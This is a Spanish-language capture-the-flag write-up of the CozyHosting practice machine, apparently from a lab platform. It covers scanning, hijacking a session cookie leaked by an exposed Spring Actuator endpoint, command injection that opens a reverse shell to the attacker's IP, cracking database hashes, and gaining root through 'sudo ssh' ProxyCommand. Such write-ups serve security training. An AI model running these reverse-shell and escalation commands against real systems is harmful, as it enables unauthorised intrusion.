

![1](</Writeups/Maquinas/CozyHosting/img/logo.png>)
By Rug4lo

## Reconocimiento 

Primero empezamos con el típico escaneo con nmap
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.230
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-12 18:05 CEST
Initiating SYN Stealth Scan at 18:05
Scanning 10.10.11.230 [65535 ports]
Discovered open port 80/tcp on 10.10.11.230
Discovered open port 22/tcp on 10.10.11.230
Completed SYN Stealth Scan at 18:05, 16.75s elapsed (65535 total ports)
Nmap scan report for 10.10.11.230
Host is up, received user-set (0.10s latency).
Scanned at 2023-09-12 18:05:30 CEST for 16s
Not shown: 65023 closed tcp ports (reset), 509 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.88 seconds
           Raw packets sent: 82953 (3.650MB) | Rcvd: 77523 (3.101MB)
```

Después hacemos un escaneo enviando unos scripts básicos de reconocimiento 

```bash
nmap -sCV -p22,80 -oN targeted 10.10.11.230
```

```bash
# Nmap 7.93 scan initiated Sun Sep  3 16:58:58 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.230
Nmap scan report for 10.10.11.230
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  3 16:59:09 2023 -- 1 IP address (1 host up) scanned in 10.41 seconds
```

En el puerto 80 hay una pagina web con un login

![1](</Writeups/Maquinas/CozyHosting/img/1.png>)

Viendo esto podemos hacer un descubrimiento de directorios con [[Dirsearch]] 

```bash
sudo dirsearch -u http://cozyhosting.htb
```
```bash
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/cozyhosting.htb/_23-09-12_18-14-31.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-09-12_18-14-31.log

Target: http://cozyhosting.htb/

[18:14:32] Starting: 
[18:14:41] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[18:14:43] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[18:14:44] 400 -  435B  - /a%5c.aspx
[18:14:45] 200 -  634B  - /actuator
[18:14:45] 200 -    5KB - /actuator/env
[18:14:45] 200 -   15B  - /actuator/health
[18:14:45] 200 -   10KB - /actuator/mappings
[18:14:45] 200 -   98B  - /actuator/sessions
[18:14:45] 200 -  124KB - /actuator/beans
[18:14:46] 401 -   97B  - /admin
[18:15:00] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[18:15:00] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[18:15:01] 500 -   73B  - /error
[18:15:01] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[18:15:01] 200 -    0B  - /extjs/resources//charts.swf
[18:15:05] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[18:15:06] 200 -   12KB - /index
[18:15:08] 200 -    4KB - /login
[18:15:08] 200 -    0B  - /login.wdm%2e
[18:15:09] 204 -    0B  - /logout
[18:15:17] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF

Task Completed
```

## Cookie hijacking

Aquí veremos un directorio muy interesante (/actuator/sessions), si nos metemos en este directorio

![1](</Writeups/Maquinas/CozyHosting/img/2.png>)

Aquí podremos ver la cookie del usuario  kanderson, por lo que podemos hacer un cookie hijacking para entrar como el usuario kanderson

Iremos al login y cambiaremos nuestra cookie por la de kanderson

![1](</Writeups/Maquinas/CozyHosting/img/3.png>)

Al reiniciar la pagina veremos que estamos en el /admin

![1](</Writeups/Maquinas/CozyHosting/img/4.png>)

Aquí veremos que tenemos una sección para insertar un hostname y un usuario, si interceptamos la peticion con [[Burpsuite]]

## Os Command Injection

Si indagamos un poco veremos que somos capaces de inyectar comandos (en mi caso puse una reverse shell)

![1](</Writeups/Maquinas/CozyHosting/img/5.png>)

El comando en base 64 que he inyectado fue esta reverse shell para ssh (poniéndome en escucha con nectat obviamente)

```bash
sh -i >& /dev/tcp/10.10.14.103/4444 0>&1
-
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzgvNDQ0NCAwPiYx
```

Al enviar la peticion nos mandara una consola interactiva

Pero si hacemos un whoami podremos ver que somos app, el cual no tiene acceso a la flag de user

Primero que todo vemos que en el directorio donde estamos y veremos un archivo **cloudhosting-0.0.1.jar**

Podemos abrir un servidor por python para descargarnos este .jar 

```bash
python3 -m http.server 4646
```

Y nos descargamos el archivo

![1](</Writeups/Maquinas/CozyHosting/img/6.png>)

Al descargarlo veremos que nos ha descargado dos archivos

![1](</Writeups/Maquinas/CozyHosting/img/7.png>)

Si lo descomprimimos 

```bash
jar -xvf cloudhosting-0.0.1.jar
```

## PostgreSQL

Podremos ver un archivo el cual nos muestra la base de datos y la contraseña

![1](</Writeups/Maquinas/CozyHosting/img/8.png>)

Si nos conectamos a la base de datos 

![1](</Writeups/Maquinas/CozyHosting/img/9.png>)

Podemos ir buscando hasta encontrar la contraseña del usuario para ssh

![1](</Writeups/Maquinas/CozyHosting/img/10.png>)

## Deshashear contraseñas 

Podemos ver que las contraseñas están hasheadas, así que podemos usar John para deshashearlas 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Ahora podemos conectarnos con ssh y meter la contraseña

![1](</Writeups/Maquinas/CozyHosting/img/11.png>)

Y tendremos ya la user flag

## Escalada de privilegios

Ahora tenemos que conseguir la root flag, para esto podremos ver que tenemos permiso para ejecutar el ssh como root y podemos usar esto para escalar privilegios

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

De esta manera conseguiremos una sh como root
